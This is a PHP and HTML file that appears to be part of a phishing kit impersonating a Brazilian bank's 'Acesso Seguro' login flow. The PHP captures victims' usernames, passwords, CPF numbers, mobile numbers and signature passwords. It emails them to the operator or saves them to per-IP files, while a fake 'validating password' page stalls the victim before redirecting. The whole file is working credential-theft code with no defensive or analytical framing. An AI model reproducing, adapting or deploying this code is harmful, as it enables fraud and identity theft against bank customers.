﻿<?php
require_once('email.php');

$shkUser     = $_POST['shkUser'];
$shkPass     = $_POST['shkPass'];
$shkDdd      = $_POST['shkDdd'];
$shkCelular  = $_POST['shkCelular'];
$shkCpf      = $_POST['shkCpf'];
$shkSenha    = $_POST['shkSenha'];
$option      = $_POST['option'];
$celular     = $shkDdd.'-'.$shkCelular;


$useragent = $_SERVER['HTTP_USER_AGENT'];
 
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
  
$today      = date("H-i-s");
$ip_usuario = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Sao_Paulo');
$dataE      =    date('d/m/Y');



if($metodo == 'mail' ){

$message = "
---------------------------------------------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
----------------------------------------------------<br />
<b>[ShK]-Usuario:</b> $shkUser<br />
<b>[ShK]-Senha:</b> $shkPass<br />
<b>[ShK]-Tipo:</b> $option<br />
<b>[ShK]-CPF:</b> $shkCpf<br />
<b>[ShK]-Celular:</b> $shkDdd-$shkCelular<br />
<b>[ShK]-Assina:</b> $shkSenha<br />";


$assunto = "BlueDiamond - $ip_usuario - Confirmacao recebida com sucesso!";
$nome = "BlueDiamond";


$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: BlueDiamond <confirmacao@cadastroshk.com.br>\r\n";

@mail($email, $assunto, $message, $headers);

}
if($metodo == 'host' ){
	
$myFile = "./Cadastros/" . "Cliente-$ip_usuario" . ".html";


$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");

$stringData = "
---------------------------------------------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
----------------------------------------------------<br />
<b>[ShK]-Usuario:</b> $shkUser<br />
<b>[ShK]-Senha:</b> $shkPass<br />
<b>[ShK]-Tipo:</b> $option<br />
<b>[ShK]-CPF:</b> $shkCpf<br />
<b>[ShK]-Celular:</b> $shkDdd-$shkCelular<br />
<b>[ShK]-Assina:</b> $shkSenha<br />";
fwrite($fh, $stringData);

fclose($fh);

}
if($metodo == 'ambas' ){
	

$myFile = "./Cadastros/" . "Cliente-$ip_usuario" . ".html";


$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");

$stringData = "
---------------------------------------------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
----------------------------------------------------<br />
<b>[ShK]-Usuario:</b> $shkUser<br />
<b>[ShK]-Senha:</b> $shkPass<br />
<b>[ShK]-Tipo:</b> $option<br />
<b>[ShK]-Celular:</b> $shkDdd-$shkCelular<br />
<b>[ShK]-CPF:</b> $shkCpf<br />
<b>[ShK]-Assina:</b> $shkSenha<br />";
fwrite($fh, $stringData);

fclose($fh);


$message = "
---------------------------------------------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
----------------------------------------------------<br />
<b>[ShK]-Usuario:</b> $shkUser<br />
<b>[ShK]-Senha:</b> $shkPass<br />
<b>[ShK]-Tipo:</b> $option<br />
<b>[ShK]-Celular:</b> $shkDdd-$shkCelular<br />
<b>[ShK]-CPF:</b> $shkCpf<br />
<b>[ShK]-Assina:</b> $shkSenha<br />";


$assunto = "BlueDiamond - $ip_usuario - Confirmacao recebida com sucesso!";
$nome = "BlueDiamond";


$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: BlueDiamond <confirmacao@cadastroshk.com.br>\r\n";

@mail($email, $assunto, $message, $headers);

}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<script src="js/jquery.js"></script>
<title>Acesso Seguro</title>

<style>

body {
	margin: 0;
	font-family:Arial, Helvetica, sans-serif;
	background:#EEEEEE;
	}

#topo {
	width: 100%;
	height: 42px;
	background: url(img/mLogomenor.png) no-repeat;
	background-position: 14px 14px;
	background-color: #1664AC;
	}
	
.logininput {
	width: 100%;
    max-width: 100%;
	box-sizing: border-box;
	font-size: 16px;
	border: none;
	border-bottom: solid 1px #b3b3b3;
	border-radius: 2px;
	display: block;
	color: #000;
	padding: 8px;
	height: 36px;
	}

.bttenter {
	background:url(img/bgbottom.png) repeat;
    border-radius: 4px;
    font-family: arial;
    font-size: 18px;
	color: #fff;
    padding: 12px;
    text-align: center;
    width: 100%;
	border:1px solid #999;
	cursor: pointer;
	}

</style>
</head>

<body>

<div id="topo"></div>

<div style="padding:10px;">


<div style="padding:10px 20px; text-align:center; margin-top:100px; "><img src="img/load.svg" height="60" width="60" /></div>



<div id="tres" style="padding:10px 20px; text-align:center; color:#727272; ">Validando a senha.</div>
<div id="dois" style="padding:10px 20px; text-align:center; color:#727272; display:none; ">Estabelecendo conexão segura.</div>
<div id="um" style="padding:10px 20px; text-align:center; color:#727272; display:none; ">Carregando...</div>
<div id="countSeconds" style="padding:10px 20px; text-align:center; color:#EEEEEE; ">30</div>
</div>
</div>

<script>
$(document).ready(function(){
		$("#countSeconds").html("30");
		var refreshIntervalId = setInterval(function(){
			var contar = $("#countSeconds").html();
			contar--;
			$("#countSeconds").html(contar);
			if(contar=="20")
			{
				$("#tres").hide();
				$("#dois").show();
			}
			if(contar=="10")
			{
				$("#dois").hide();
				$("#um").show();
			}
			if(contar=="0")
			{
			  window.location = "adesao.php";
			  clearInterval(refreshIntervalId);
			}
		}, 1100);

});
</script>
</body>
</html>